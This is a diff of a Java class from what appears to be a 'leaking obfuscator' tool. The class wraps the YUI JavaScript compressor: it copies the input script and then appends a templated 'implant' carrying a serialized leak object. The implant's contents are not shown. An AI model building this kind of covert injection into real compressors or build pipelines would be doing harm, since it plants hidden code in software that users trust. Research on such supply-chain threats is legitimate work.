@@ -1,12 +1,15 @@
 package com.leakingobfuscator.leaker;
 
 import com.leakingobfuscator.common.LeakObject;
+import com.leakingobfuscator.common.utils.IOUtil;
+import com.leakingobfuscator.leaker.templates.ScriptTemplate;
 import com.yahoo.platform.yui.compressor.ShadowInputStreamReader;
-import com.leakingobfuscator.leaker.implant.ImplantTemplate;
 import org.mozilla.javascript.ErrorReporter;
 import org.mozilla.javascript.EvaluatorException;
 
 import java.io.IOException;
+import java.io.Reader;
+import java.io.Writer;
 import java.util.HashMap;
 
 public class ContextLeakingJavaScriptCompressor extends LeakingJavaScriptCompressor {
@@ -18,14 +21,17 @@ public class ContextLeakingJavaScriptCompressor extends LeakingJavaScriptCompres
     }
 
     @Override
-    public String generateImplant(LeakObject leakObj) {
+    public boolean writeLeakingOutput(Writer outWriter, Reader inReader, LeakObject leakObj) {
         try {
             HashMap<String, String> replacements = new HashMap<String, String>();
             replacements.put("c:" + FIELD_LEAK_OBJ, leakObj.toJSON());
 
-            return ImplantTemplate.generate(IMPLANT_FN, replacements);
+            IOUtil.copy(inReader, outWriter);
+            ScriptTemplate.generate(IMPLANT_FN, outWriter, replacements);
+
+            return true;
         } catch (IOException e) {
-            return null;
+            return false;
         }
     }
 
